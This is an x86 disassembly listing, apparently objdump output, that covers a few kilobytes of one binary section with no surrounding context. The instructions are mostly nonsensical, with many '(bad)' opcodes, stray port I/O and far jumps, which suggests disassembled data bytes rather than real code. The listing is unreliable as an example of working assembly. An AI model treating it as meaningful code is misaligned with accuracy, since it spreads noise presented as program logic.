  416d50:	xor    ch,BYTE PTR [edi+eiz*2]
  416d53:	mov    edx,0x32d6ebe1
  416d58:	sbb    eax,0xf6554165
  416d5d:	js     0x416ce7
  416d5f:	daa    
  416d60:	lods   eax,DWORD PTR ds:[esi]
  416d61:	pop    esi
  416d62:	adc    eax,0xb2bf4067
  416d67:	mul    BYTE PTR [esi+eiz*8-0x7]
  416d6b:	sbb    ebx,DWORD PTR [ebx-0x36bf18ad]
  416d71:	aam    0x1b
  416d73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d74:	in     al,dx
  416d75:	shl    DWORD PTR [ebp-0x2362d23],1
  416d7b:	out    dx,eax
  416d7c:	clc    
  416d7d:	(bad)  
  416d7e:	jo     0x416d73
  416d80:	xchg   ebx,eax
  416d81:	and    ebp,eax
  416d83:	test   DWORD PTR [ebp+0x5d],ecx
  416d86:	jp     0x416d61
  416d88:	dec    ebp
  416d89:	in     eax,dx
  416d8a:	cs xchg ecx,eax
  416d8c:	cmp    al,0x14
  416d8e:	adc    BYTE PTR [esi-0x6f624d12],0x19
  416d95:	sbb    BYTE PTR [ecx+0x15732b57],bl
  416d9b:	out    dx,al
  416d9c:	mov    ebx,0x243d7fa3
  416da1:	jb     0x416e02
  416da3:	dec    ebx
  416da4:	adc    al,0xd0
  416da6:	(bad)  
  416da8:	je     0x416d2e
  416daa:	ficomp DWORD PTR ds:0x35cfa638
  416db0:	cmp    al,0xeb
  416db2:	inc    edi
  416db3:	retf   
  416db4:	or     eax,0x67e88c25
  416db9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416dba:	pop    esi
  416dbb:	push   0x399b247b
  416dc0:	rcl    BYTE PTR [edx+0x2e4a442b],1
  416dc6:	fcomp  QWORD PTR [ebx+0x44]
  416dc9:	scas   al,BYTE PTR es:[edi]
  416dca:	cld    
  416dcb:	sbb    eax,0x9d2984f3
  416dd0:	stc    
  416dd1:	push   ds
  416dd2:	and    edx,DWORD PTR [eax-0x5384670a]
  416dd8:	and    DWORD PTR [eax+0x1],edi
  416ddb:	iret   
  416ddc:	mov    edx,0xc877903b
  416de1:	and    BYTE PTR [ecx],cl
  416de3:	pop    eax
  416de4:	int    0x37
  416de6:	push   0x2e9caa09
  416deb:	jmp    0xecf6b7da
  416df0:	shl    DWORD PTR [ebx],cl
  416df2:	mov    dl,0xd5
  416df4:	shr    BYTE PTR [ebp+0x30],1
  416df7:	(bad)  
  416df8:	sbb    ch,BYTE PTR [esi+0x38]
  416dfb:	stc    
  416dfc:	fmul   st(3),st
  416dfe:	and    BYTE PTR [ecx-0x4c],al
  416e01:	adc    eax,0xd880e6ac
  416e06:	dec    ebx
  416e07:	hlt    
  416e08:	mov    ds:0x8dac322f,eax
  416e0d:	icebp  
  416e0e:	test   DWORD PTR [edi+0x28],0xd9231a5b
  416e15:	pop    ss
  416e16:	ja     0x416dbb
  416e18:	dec    ecx
  416e19:	fnstenv [ebx+esi*1]
  416e1c:	cli    
  416e1d:	out    dx,al
  416e1e:	xor    BYTE PTR [ebx],cl
  416e20:	test   eax,0x2c90224a
  416e25:	rcl    BYTE PTR [esi+0x7c],0x4c
  416e29:	lock jle 0x416e27
  416e2c:	std    
  416e2d:	inc    eax
  416e2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e2f:	mov    ebp,0x9b19dba7
  416e34:	push   0xffffffa8
  416e36:	rcl    BYTE PTR [ecx-0x6d],cl
  416e39:	ja     0x416e59
  416e3b:	dec    esi
  416e3c:	call   0xe9e42f5
  416e41:	fisttp QWORD PTR [bx+di+0x4975]
  416e46:	pop    edi
  416e47:	and    DWORD PTR [ebx+0x17],ebp
  416e4a:	popf   
  416e4b:	xchg   edi,eax
  416e4c:	push   edi
  416e4d:	jns    0x416e0a
  416e4f:	sahf   
  416e50:	(bad)  
  416e51:	sbb    ebx,DWORD PTR [ecx+0x74]
  416e54:	inc    ebp
  416e55:	pop    eax
  416e56:	push   edx
  416e57:	dec    ebx
  416e58:	inc    ebx
  416e59:	test   al,0x54
  416e5b:	arpl   sp,sp
  416e5d:	jb     0x416dfd
  416e5f:	imul   DWORD PTR [eax+0x3028a826]
  416e65:	push   ds
  416e66:	sbb    DWORD PTR [edx-0x2b],eax
  416e69:	mov    dh,0xa4
  416e6b:	sub    al,0x14
  416e6d:	inc    ebp
  416e6e:	adc    eax,esp
  416e70:	cdq    
  416e71:	jbe    0x416e9f
  416e73:	push   edx
  416e74:	mov    ah,0x49
  416e76:	inc    esp
  416e77:	cmp    ah,BYTE PTR ss:[ebp+ebp*2-0x2e]
  416e7c:	sbb    esi,DWORD PTR [edi]
  416e7e:	push   cs
  416e7f:	sbb    ecx,DWORD PTR [eax+0x698cf2e5]
  416e85:	lods   eax,DWORD PTR ds:[esi]
  416e86:	loop   0x416e4a
  416e88:	cmp    BYTE PTR [ecx-0x480ab527],0xb8
  416e8f:	pop    ebx
  416e90:	push   ecx
  416e91:	mov    ebx,0x9e35133c
  416e96:	cld    
  416e97:	idiv   DWORD PTR [edi-0x23731343]
  416e9d:	sbb    edi,esi
  416e9f:	imul   ecx,DWORD PTR [ecx-0x3b1a96d3],0xc78e3a22
  416ea9:	pop    ds
  416eaa:	mov    ds:0x1caf37d7,al
  416eaf:	cmp    ebx,eax
  416eb1:	loopne 0x416e52
  416eb3:	push   edi
  416eb4:	(bad)  
  416eb5:	sbb    eax,0x72c862db
  416eba:	pop    es
  416ebb:	mov    bl,0x6e
  416ebd:	cs mov dh,0x14
  416ec0:	cmp    DWORD PTR [eax-0x12db5be7],eax
  416ec6:	popf   
  416ec7:	adc    dh,BYTE PTR [eax]
  416ec9:	addr16 popf 
  416ecb:	cdq    
  416ecc:	cmp    dh,al
  416ece:	mov    dl,0x94
  416ed0:	xchg   ebx,eax
  416ed1:	int3   
  416ed2:	iret   
  416ed3:	mov    eax,ds:0x9bf0c9f
  416ed8:	mov    ch,0x9e
  416eda:	bound  eax,QWORD PTR [ecx+0x77]
  416edd:	cwde   
  416ede:	xor    BYTE PTR [esi],0xd
  416ee1:	imul   ebx,DWORD PTR [ebx-0x717a3b04],0x88def613
  416eeb:	xor    al,0x1c
  416eed:	inc    edx
  416eee:	cmp    al,0xfc
  416ef0:	xor    BYTE PTR fs:[esi],bh
  416ef3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ef4:	es xchg ebx,eax
  416ef6:	mov    BYTE PTR [edx+0x46],al
  416ef9:	fwait
  416efa:	xlat   BYTE PTR ds:[ebx]
  416efb:	mov    al,0x74
  416efd:	adc    ah,ah
  416eff:	mov    bl,0x79
  416f01:	or     DWORD PTR [edx],eax
  416f03:	and    al,0xc5
  416f05:	mov    ch,0x9
  416f07:	pusha  
  416f08:	in     al,dx
  416f09:	sbb    dl,ch
  416f0b:	or     al,0x68
  416f0d:	pop    esi
  416f0e:	pop    eax
  416f0f:	adc    BYTE PTR [eax+0x6ea8b4ec],dl
  416f15:	xor    dl,bl
  416f17:	adc    DWORD PTR [eax],edx
  416f19:	ins    BYTE PTR es:[edi],dx
  416f1a:	in     al,0x3c
  416f1c:	idiv   cl
  416f1e:	fdivr  QWORD PTR [ebx-0x4f]
  416f21:	fstp   QWORD PTR [ebx-0x783f84b1]
  416f27:	xor    bh,BYTE PTR [ebp-0x112ff34b]
  416f2d:	sub    DWORD PTR [ecx+edx*4],ebx
  416f30:	cmp    al,0xda
  416f32:	adc    esi,DWORD PTR [eax-0x45]
  416f35:	nop
  416f36:	call   0xc05be9d1
  416f3b:	cdq    
  416f3c:	(bad)  
  416f3d:	call   0x9929:0x681c7ef3
  416f44:	and    dh,bh
  416f46:	scas   al,BYTE PTR es:[edi]
  416f47:	cmp    eax,DWORD PTR [esi-0x21]
  416f4a:	test   BYTE PTR [esi+0x62856cc2],dh
  416f50:	pushf  
  416f51:	and    al,ah
  416f53:	mov    cl,0xa6
  416f55:	dec    esp
  416f56:	popa   
  416f57:	ins    BYTE PTR es:[edi],dx
  416f58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f59:	les    edx,FWORD PTR [ebp+0x65]
  416f5c:	add    bl,BYTE PTR [eax-0x72]
  416f5f:	sbb    eax,0xc531dfdb
  416f64:	fst    QWORD PTR [edx]
  416f66:	cmp    eax,DWORD PTR [eax-0x62a809ff]
  416f6c:	push   esp
  416f6d:	sbb    al,0x91
  416f6f:	lds    ebp,FWORD PTR [ecx+0x2f]
  416f72:	shr    DWORD PTR [edi+ecx*8],cl
  416f75:	les    edx,FWORD PTR [ebp+0x56]
  416f78:	call   0xb5638fea
  416f7d:	outs   dx,DWORD PTR ds:[esi]
  416f7e:	dec    ebx
  416f7f:	jns    0x416f11
  416f81:	lock inc ebp
  416f83:	dec    edx
  416f84:	pop    es
  416f85:	scas   eax,DWORD PTR es:[edi]
  416f86:	das    
  416f87:	(bad)  
  416f88:	clc    
  416f89:	or     eax,0x71b85595
  416f8e:	cdq    
  416f8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f90:	ja     0x416fcd
  416f92:	test   ebx,edi
  416f94:	inc    esp
  416f95:	sub    DWORD PTR [edi+0x69],edx
  416f98:	sub    eax,0xa45fbd34
  416f9d:	outs   dx,BYTE PTR ds:[esi]
  416f9e:	sub    DWORD PTR [edx+0x43be8583],esp
  416fa4:	inc    ecx
  416fa5:	dec    ecx
  416fa6:	sub    eax,DWORD PTR [edi]
  416fa8:	dec    eax
  416fa9:	sub    BYTE PTR [ebx*1+0x673cca4e],ch
  416fb0:	sub    esp,esi
  416fb2:	ret    
  416fb3:	out    dx,al
  416fb4:	fdivrp st(0),st
  416fb6:	lods   al,BYTE PTR ds:[esi]
  416fb7:	(bad)  
  416fb8:	jmp    0x416ffb
  416fba:	jb     0x416f82
  416fbc:	popf   
  416fbd:	test   DWORD PTR [edx-0x77],esp
  416fc0:	mov    ebp,0x1f30c8
  416fc5:	push   ebx
  416fc6:	(bad)  
  416fc7:	ss cmp bl,al
  416fca:	sbb    BYTE PTR [ebx-0x44],bl
  416fcd:	sbb    ebx,ebp
  416fcf:	mov    ?,WORD PTR [ebx-0x57]
  416fd2:	xchg   DWORD PTR [ebp+0x4c],eax
  416fd5:	(bad)  
  416fd6:	out    0xe0,eax
  416fd8:	push   ebp
  416fd9:	mov    al,ds:0x9d726313
  416fde:	adc    BYTE PTR [esi+0x40cc68d9],bh
  416fe4:	mov    ah,BYTE PTR [esi+0x37]
  416fe7:	jae    0x416fcc
  416fe9:	mul    DWORD PTR ds:0x3b84d1d7
  416fef:	retf   0x783
  416ff2:	in     al,dx
  416ff3:	jge    0x417018
  416ff5:	(bad)  
  416ff6:	lock pop edi
  416ff8:	lahf   
  416ff9:	std    
  416ffa:	psubd  mm2,QWORD PTR [ebx+0x4380a1b5]
  417001:	add    BYTE PTR [eax-0x251126dc],bh
  417007:	pop    ecx
  417008:	dec    ecx
  417009:	hlt    
  41700a:	jecxz  0x417053
  41700c:	inc    ecx
  41700d:	stos   BYTE PTR es:[edi],al
  41700e:	mov    al,0xb3
  417010:	mov    ah,0xd
  417012:	imul   edx,ebp,0xffffffb0
  417015:	cmp    al,bl
  417017:	sbb    DWORD PTR [esi-0x11],esi
  41701a:	dec    eax
  41701b:	loop   0x416fd5
  41701d:	retf   0x98ab
  417020:	stos   BYTE PTR es:[edi],al
  417021:	mov    dl,0x1a
  417023:	imul   edx,eax,0x9c23d625
  417029:	add    BYTE PTR [ecx],cl
  41702b:	push   es
  41702c:	xchg   ebx,eax
  41702d:	mov    ?,WORD PTR [esi-0x7a]
  417030:	(bad)  
  417031:	gs xchg ebx,eax
  417033:	rol    DWORD PTR [eax+ecx*1-0x8],0x97
  417038:	int    0xcb
  41703a:	fistp  WORD PTR [ebp-0x5a96f62f]
  417040:	dec    ebx
  417041:	bound  edi,QWORD PTR [ebx-0x26]
  417044:	test   DWORD PTR [ebx],ebx
  417046:	(bad)  
  417047:	clc    
  417048:	shl    DWORD PTR [eax-0x7afef67],cl
  41704e:	push   cs
  41704f:	push   DWORD PTR [edx+0x27]
  417052:	ins    BYTE PTR es:[edi],dx
  417053:	and    ah,BYTE PTR [esp+esi*1-0x62b51b0]
  41705a:	mov    edx,0xf0449650
  41705f:	shl    DWORD PTR [ecx+ecx*2-0x278b95e2],1
  417066:	push   0x31
  417068:	loope  0x4170cb
  41706a:	xchg   DWORD PTR [edi],eax
  41706c:	sub    ch,BYTE PTR [ecx+eiz*2+0x15]
  417070:	push   cs
  417071:	sbb    al,0xcb
  417073:	(bad)  
  417074:	jge    0x41704d
  417076:	pop    ss
  417077:	loopne 0x41705c
  417079:	mov    esp,0x9086fe8d
  41707e:	pusha  
  41707f:	jmp    0xbfb2:0x94ffe189
  417086:	scas   eax,DWORD PTR es:[edi]
  417087:	cld    
  417088:	cld    
  417089:	(bad)  
  41708a:	xor    ecx,DWORD PTR ds:0x847cac19
  417090:	push   0xffffffb4
  417092:	mov    esi,0x9ddde7d2
  417097:	sub    DWORD PTR [eax+ebp*4],0xffffffba
  41709b:	xchg   esp,eax
  41709c:	push   ds
  41709d:	ret    0x5d1a
  4170a0:	mov    BYTE PTR [ebx+0xb75851c],bl
  4170a6:	sbb    ebp,ecx
  4170a8:	inc    edi
  4170a9:	dec    esp
  4170aa:	enter  0x8b3b,0x9e
  4170ae:	outs   dx,BYTE PTR ds:[esi]
  4170af:	icebp  
  4170b0:	or     ebx,ebp
  4170b2:	dec    ebx
  4170b3:	and    BYTE PTR ds:0x1749b6b,ah
  4170b9:	aam    0xe0
  4170bb:	push   ebp
  4170bc:	add    al,0xf7
  4170be:	mov    eax,0xb15ed498
  4170c3:	(bad)  
  4170c5:	not    BYTE PTR [edx]
  4170c7:	adc    al,BYTE PTR [ebx]
  4170c9:	jecxz  0x417144
  4170cb:	pop    edi
  4170cc:	mov    esi,0xf2df4620
  4170d1:	fnsave [eax-0x78]
  4170d4:	cli    
  4170d5:	inc    esi
  4170d6:	add    dh,BYTE PTR [ebp-0x7b]
  4170d9:	jle    0x417080
  4170db:	sbb    DWORD PTR [ebp-0x581d44fb],eax
  4170e1:	xchg   ebp,eax
  4170e2:	rcl    ah,0xe
  4170e5:	or     BYTE PTR [ebx+ebp*4-0x68051de4],cl
  4170ec:	ret    
  4170ed:	mov    ch,0xf2
  4170ef:	pop    ebx
  4170f0:	cmp    al,BYTE PTR [eax]
  4170f2:	dec    esi
  4170f3:	xchg   edi,eax
  4170f4:	mov    eax,0x309c9937
  4170f9:	cli    
  4170fa:	popa   
  4170fb:	ror    DWORD PTR [eax],1
  4170fd:	jmp    0x41713e
  4170ff:	xchg   ebp,eax
  417100:	jns    0x4170c8
  417102:	or     bl,BYTE PTR [ecx]
  417104:	pop    esp
  417105:	or     BYTE PTR [edx+0x4717af3b],ah
  41710b:	psrlw  mm5,mm7
  41710e:	push   eax
  41710f:	pushf  
  417110:	addr16 mov ds:0xa2a3,al
  417114:	or     esi,0xaa503a3b
  41711a:	sub    DWORD PTR [ecx-0x5d],edx
  41711d:	dec    esp
  41711e:	mov    ecx,0x296645f4
  417123:	mov    eax,0xed529ae5
  417128:	mov    edx,cs
  41712a:	mov    al,ds:0x15464f32
  41712f:	mov    bh,0x68
  417131:	fistp  QWORD PTR [esi+0xf]
  417134:	dec    esi
  417135:	enter  0x2def,0xb2
  417139:	push   esp
  41713a:	adc    edi,eax
  41713c:	ins    DWORD PTR es:[edi],dx
  41713d:	dec    edi
  41713e:	mov    ebx,ebp
  417140:	jle    0x4170e4
  417142:	lds    ebp,FWORD PTR [ecx]
  417144:	adc    dh,BYTE PTR [esi]
  417146:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417147:	mov    WORD PTR es:[ecx-0x3983ca5c],cs
  41714e:	lds    edi,FWORD PTR [ebx]
  417150:	inc    eax
  417151:	popa   
  417152:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417153:	pop    esi
  417154:	and    bh,BYTE PTR [ebx-0x6cd97b14]
  41715a:	fmul   st(0),st
  41715c:	pushf  
  41715d:	aas    
  41715e:	ins    BYTE PTR es:[edi],dx
  41715f:	popf   
  417160:	sub    ebp,DWORD PTR [esi]
  417162:	retf   
  417163:	sub    bl,BYTE PTR [edx]
  417165:	dec    eax
  417166:	rcl    DWORD PTR [ebx+edx*1-0x56],cl
  41716a:	cli    
  41716b:	fadd   st(3),st
  41716d:	sahf   
  41716e:	add    BYTE PTR [edx],dh
  417170:	xor    cl,BYTE PTR [eax+0x3bc144c]
  417176:	push   ebx
  417177:	jge    0x41717b
  417179:	call   0xef30:0x42480ebd
  417180:	mov    edx,0xa4ea897d
  417185:	ret    
  417186:	(bad)  
  417187:	sti    
  417188:	imul   esp,DWORD PTR [esi],0xe416e561
  41718e:	pop    edi
  41718f:	add    DWORD PTR fs:[esi],ebp
  417192:	in     eax,dx
  417193:	fsubr  QWORD PTR [ebx-0x61]
  417196:	int    0x98
  417198:	adc    al,bl
  41719a:	ret    0xad5
  41719d:	pusha  
  41719e:	aad    0xf5
  4171a0:	xchg   ebx,ebp
  4171a2:	sbb    al,0xdf
  4171a4:	pop    edi
  4171a5:	in     eax,dx
  4171a6:	cld    
  4171a7:	pop    edi
  4171a8:	in     eax,dx
  4171a9:	in     eax,0x9b
  4171ab:	sub    dl,0x66
  4171ae:	dec    esp
  4171af:	rol    BYTE PTR ds:0xe5264847,0x7d
  4171b6:	sar    ebp,cl
  4171b8:	sub    DWORD PTR [ebp+ecx*2+0x4fcc5af],0xffffffb1
  4171c0:	adc    edx,DWORD PTR [esi-0x1cd41522]
  4171c6:	test   al,ch
  4171c8:	mov    esp,0xd77b1976
  4171cd:	or     bh,ah
  4171cf:	xchg   ebx,eax
  4171d0:	sbb    BYTE PTR [ebp-0x54],0x2
  4171d4:	xchg   ebx,eax
  4171d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171d6:	or     eax,0x9bb28a53
  4171db:	arpl   dx,sp
  4171dd:	xor    esi,ecx
  4171df:	jo     0x417162
  4171e1:	cmp    DWORD PTR [ebx+ecx*1-0x34],0xe7a5ae3
  4171e9:	ja     0x417188
  4171eb:	and    BYTE PTR [ebp+ebx*2-0x3640d56],al
  4171f2:	fldcw  WORD PTR [ecx]
  4171f4:	ins    BYTE PTR es:[edi],dx
  4171f5:	retf   0x79ce
  4171f8:	push   ecx
  4171f9:	and    eax,DWORD PTR [edi]
  4171fb:	xor    al,0x8b
  4171fd:	lds    edi,FWORD PTR [ebp+0x7d23654d]
  417203:	add    BYTE PTR [edx-0x54],0xc5
  417207:	into   
  417208:	pop    esi
  417209:	popf   
  41720a:	mov    al,ds:0x45ef4e58
  41720f:	jb     0x4171db
  417211:	xor    al,0x94
  417213:	push   ss
  417214:	mov    DWORD PTR [edi],edi
  417216:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417218:	call   0x7d43:0xd22c207c
  41721f:	mov    al,0xa0
  417221:	mov    dl,BYTE PTR [ebx+0x5fec37f2]
  417227:	xor    edx,esi
  417229:	test   al,0x26
  41722b:	std    
  41722c:	mov    bh,0x93
  41722e:	(bad)  
  41722f:	inc    esp
  417230:	in     al,dx
  417231:	pop    ss
  417232:	mov    al,ds:0xb6778ea8
  417237:	dec    edx
  417238:	push   ecx
  417239:	(bad)  
  41723a:	jbe    0x4171cc
  41723c:	iret   
  41723d:	pop    esp
  41723e:	jge    0x4172b0
  417240:	sub    BYTE PTR [edx+eiz*2],0x4e
  417244:	cli    
  417245:	addr16 mov ah,0x7e
  417248:	lods   eax,DWORD PTR ds:[esi]
  417249:	mov    ch,0xff
  41724b:	xchg   ebp,eax
  41724c:	out    dx,eax
  41724d:	pop    esi
  41724e:	inc    ebx
  41724f:	out    0xa6,al
  417251:	xchg   DWORD PTR [eax+0x48],ecx
  417254:	adc    al,0xab
  417256:	xchg   ebx,eax
  417257:	fwait
  417258:	push   ebx
  417259:	(bad)  
  41725a:	rcr    BYTE PTR [edi-0xc],cl
  41725d:	push   ebx
  41725e:	retf   0x115c
  417261:	dec    ecx
  417262:	and    eax,0x66d21818
  417267:	dec    ebp
  417268:	shl    DWORD PTR [ebx-0x218994e4],cl
  41726e:	aas    
  41726f:	pop    esp
  417270:	fist   WORD PTR [eax-0x3741d26b]
  417276:	(bad)  
  417277:	fcom   QWORD PTR [ebp-0x7bd2bbb8]
  41727d:	popf   
  41727e:	ins    BYTE PTR es:[edi],dx
  41727f:	or     eax,0xa13bde4a
  417284:	xor    edi,DWORD PTR [eax+0x1aa917e5]
  41728a:	cld    
  41728b:	mov    bh,0xf1
  41728d:	mov    ebx,DWORD PTR [edi]
  41728f:	cmp    eax,0x999f4cc2
  417294:	repz iret 
  417296:	(bad)  
  417297:	stos   DWORD PTR es:[edi],eax
  417298:	mov    ds:0x89546d58,eax
  41729d:	mov    ah,0x3e
  41729f:	add    cl,dh
  4172a1:	jae    0x417234
  4172a3:	adc    BYTE PTR [ebx],bh
  4172a5:	lahf   
  4172a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172a7:	(bad)  
  4172a8:	jbe    0x4172e8
  4172aa:	xor    al,0xd
  4172ac:	sub    eax,0xd6f7e1d0
  4172b1:	fdivrp st(2),st
  4172b3:	or     BYTE PTR [esi+0x4e],ch
  4172b6:	inc    esi
  4172b7:	fsubr  QWORD PTR [esi-0x67]
  4172ba:	mov    edi,0x1f6c73e6
  4172bf:	retf   
  4172c0:	pop    ds
  4172c1:	std    
  4172c2:	imul   ecx,esp,0xffffff93
  4172c5:	jns    0x41731b
  4172c7:	xor    ebp,DWORD PTR [edi]
  4172c9:	mov    edi,0xe3aaa4cc
  4172ce:	icebp  
  4172cf:	sbb    DWORD PTR [esi-0x64ba4ab2],esi
  4172d5:	sbb    eax,0xde8cd110
  4172da:	ret    
  4172db:	out    dx,al
  4172dc:	push   esi
  4172dd:	bound  ebx,QWORD PTR [edx+0x5a358eff]
  4172e3:	out    dx,al
  4172e4:	mov    bl,0xd7
  4172e6:	mov    dl,0x85
  4172e8:	jge    0x41730b
  4172ea:	inc    ebx
  4172eb:	in     al,0x65
  4172ed:	push   ds
  4172ee:	sar    DWORD PTR [esi-0x47],0xc9
  4172f2:	sahf   
  4172f3:	addr16 cdq 
  4172f5:	or     eax,0xe88d856e
  4172fa:	mov    ebx,0x7fcc409
  4172ff:	pop    esp
  417300:	stc    
  417301:	sbb    BYTE PTR [edi+0x49710879],bl
  417307:	idiv   eax
  417309:	rol    BYTE PTR [ebp+0x108b0eb1],1
  41730f:	or     dh,BYTE PTR [ebx+edi*2-0x7e]
  417313:	int3   
  417314:	fwait
  417315:	push   ebx
  417316:	sbb    dl,BYTE PTR [edi-0x65e90fd]
  41731c:	pop    esi
  41731d:	rep ins DWORD PTR es:[edi],dx
  41731f:	mul    esi
  417321:	jb     0x417365
  417323:	cmp    BYTE PTR [edx-0x5df1fde2],bh
  417329:	pushf  
  41732a:	ror    BYTE PTR [edi+0x37],0xe9
  41732e:	inc    esp
  41732f:	int3   
  417330:	pop    esi
  417331:	inc    ecx
  417332:	sbb    DWORD PTR [ecx+0x43],edx
  417335:	fist   WORD PTR [esp+ebx*2+0x4b]
  417339:	push   ss
  41733a:	ds jg  0xd9454196
  417341:	cmp    eax,0xa3cc5a05
  417346:	sub    eax,0x42c5b28f
  41734b:	cmp    DWORD PTR [ebx+ebx*4-0x74860e8d],esp
  417352:	pop    ebp
  417353:	dec    ebx
  417354:	pop    ds
  417355:	imul   esi,ebx,0xffffffbc
  417358:	mov    bh,cl
  41735a:	retf   
  41735b:	dec    ecx
  41735c:	mov    bl,0xeb
  41735e:	pop    ebx
  41735f:	ret    0xad83
  417362:	push   edi
  417363:	ins    BYTE PTR es:[edi],dx
  417364:	(bad)
  417367:	jbe    0x417322
  417369:	xchg   ebp,eax
  41736a:	jb     0x4173b6
  41736c:	push   ebp
  41736d:	rcl    BYTE PTR [eax-0x49],1
  417370:	sub    BYTE PTR [ecx-0xd],cl
  417373:	fcmove st,st(4)
  417375:	jp     0x41737d
  417377:	int    0x46
  417379:	ret    0xf1f2
  41737c:	dec    edi
  41737d:	shl    DWORD PTR [ecx-0x5af0ddd5],1
  417383:	jae    0x4173aa
  417385:	jo     0x417313
  417387:	out    0x7c,al
  417389:	xor    esp,DWORD PTR [edx]
  41738b:	add    eax,0x2fc1df8b
  417390:	ret    0x66c3
  417393:	cmp    al,0x81
  417395:	lds    eax,FWORD PTR [ebp+0x26]
  417398:	(bad)  
  417399:	call   0x5c97:0x85a5ae36
  4173a0:	jnp    0x417411
  4173a2:	pop    ebp
  4173a3:	out    dx,eax
  4173a4:	lock pop esi
  4173a6:	jecxz  0x4173ef
  4173a8:	mov    esi,DWORD PTR [edi+0x7f60320f]
  4173ae:	call   0x7278:0xb8e036e0
  4173b5:	stos   DWORD PTR es:[edi],eax
  4173b6:	and    cl,BYTE PTR [edx-0x69184967]
  4173bc:	sbb    dl,al
  4173be:	mov    edi,0x2dc36ef3
  4173c3:	mov    ds:0x6921a3cd,eax
  4173c8:	pop    esp
  4173c9:	xor    ah,cl
  4173cb:	mov    edi,0xdf92f142
  4173d0:	push   esi
  4173d1:	lods   al,BYTE PTR ds:[esi]
  4173d2:	xor    bh,BYTE PTR [esi]
  4173d4:	test   BYTE PTR [ebx],dh
  4173d6:	mov    ds:0x70393f95,al
  4173db:	jb     0x417365
  4173dd:	pop    ebx
  4173de:	fsub   st,st(6)
  4173e0:	xchg   BYTE PTR [edi],ch
  4173e2:	fild   QWORD PTR [ebp+0x35]
  4173e5:	daa    
  4173e6:	xor    BYTE PTR [ebp+0x20549e2f],bh
  4173ec:	das    
  4173ed:	inc    esi
  4173ee:	inc    edi
  4173ef:	sbb    al,0x1c
  4173f1:	test   al,0x5e
  4173f3:	aas    
  4173f4:	fadd   QWORD PTR [eax]
  4173f6:	pop    ds
  4173f7:	test   DWORD PTR [edx-0x51],ebx
  4173fa:	scas   eax,DWORD PTR es:[edi]
  4173fb:	add    DWORD PTR [ebx-0x47c96ce5],ebp
  417401:	stos   BYTE PTR es:[edi],al
  417402:	call   FWORD PTR [esi]
  417404:	jne    0x417421
  417406:	icebp  
  417407:	lods   eax,DWORD PTR ds:[esi]
  417408:	jecxz  0x4173c2
  41740a:	(bad)  [ebx]
  41740c:	sub    eax,0x959f14bd
  417411:	sbb    eax,DWORD PTR [ecx+0x16]
  417414:	popa   
  417415:	loope  0x417424
  417417:	or     edi,DWORD PTR [ebp+ecx*8-0x59]
  41741b:	push   eax
  41741c:	call   0x78d2:0x66a26d05
  417423:	mov    WORD PTR [ebx],?
  417425:	loopne 0x417437
  417427:	cmc    
  417428:	sub    bl,al
  41742a:	xor    eax,0x75b0ccf5
  41742f:	pop    ss
  417430:	mov    esi,0x26f4c81f
  417435:	mov    cl,BYTE PTR [ecx+0x14]
  417438:	ror    BYTE PTR [eax],cl
  41743a:	jecxz  0x4173f6
  41743c:	inc    ecx
  41743d:	in     al,dx
  41743e:	hlt    
  41743f:	retf   
  417440:	and    ch,BYTE PTR [edi+0x37]
  417443:	cmp    eax,0x43ecbdac
  417448:	inc    ecx
  417449:	add    al,0x66
  41744b:	stos   BYTE PTR es:[edi],al
  41744c:	mov    BYTE PTR [esi-0x20c3bb08],dl
  417452:	push   esp
  417453:	jmp    0xb6344ee1
  417458:	pop    edi
  417459:	jmp    0x4173ec
  41745b:	mov    eax,0xbeec87db
  417460:	jnp    0x41746f
  417462:	in     al,dx
  417463:	ss loope 0x417442
  417466:	inc    eax
  417467:	sbb    eax,0xd900cbd3
  41746c:	add    DWORD PTR [esp+eiz*2],0x78e2da45
  417473:	int3   
  417474:	push   esi
  417475:	outs   dx,BYTE PTR ds:[esi]
  417476:	xchg   edx,esp
  417478:	mov    ah,0x6
  41747a:	mov    dh,0x79
  41747c:	cwde   
  41747d:	pop    eax
  41747e:	mov    edx,0x7d6db46f
  417483:	mov    bl,0x1e
  417485:	out    dx,al
  417486:	popa   
  417487:	mov    al,ds:0xa4548c1b
  41748c:	xor    eax,0x35f0f68a
  417491:	aas    
  417492:	fs stos BYTE PTR es:[edi],al
  417494:	xchg   esi,eax
  417495:	push   ss
  417496:	rcr    eax,1
  417498:	mov    dl,0xc9
  41749a:	xchg   esi,eax
  41749b:	xchg   edx,eax
  41749c:	xchg   edi,eax
  41749d:	or     al,0x34
  41749f:	cmp    bl,bh
  4174a1:	mov    al,BYTE PTR [ecx+0x1a]
  4174a4:	pop    ss
  4174a5:	test   DWORD PTR ds:0x969f8bfe,edi
  4174ab:	mov    esi,0x4d0d0ecc
  4174b0:	add    al,0x91
  4174b2:	push   ebx
  4174b3:	pop    es
  4174b4:	cmp    bh,BYTE PTR [esi-0x27]
  4174b7:	int3   
  4174b8:	test   al,dl
  4174ba:	xchg   ebx,eax
  4174bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174bc:	adc    edx,esi
  4174be:	and    DWORD PTR [edx+0x75],ebx
  4174c1:	sbb    edx,DWORD PTR [edx+0x67b50298]
  4174c7:	rcr    DWORD PTR [esp+edx*1-0x43],cl
  4174cb:	add    WORD PTR [ebx+ecx*1],si
  4174cf:	lahf   
  4174d0:	into   
  4174d1:	es out 0xb6,eax
  4174d4:	mov    eax,0x1ab7733d
  4174d9:	mov    WORD PTR es:[ebp-0x1],gs
  4174dd:	or     eax,0x8d33d90
  4174e2:	add    al,0xd4
  4174e4:	xchg   esp,eax
  4174e5:	xchg   esp,eax
  4174e6:	in     eax,dx
  4174e7:	jecxz  0x4174dc
  4174e9:	or     dh,BYTE PTR [eax+0x35]
  4174ec:	loopne 0x4174f4
  4174ee:	jge    0x4174e3
  4174f0:	not    BYTE PTR [ebp-0x37fcf5a4]
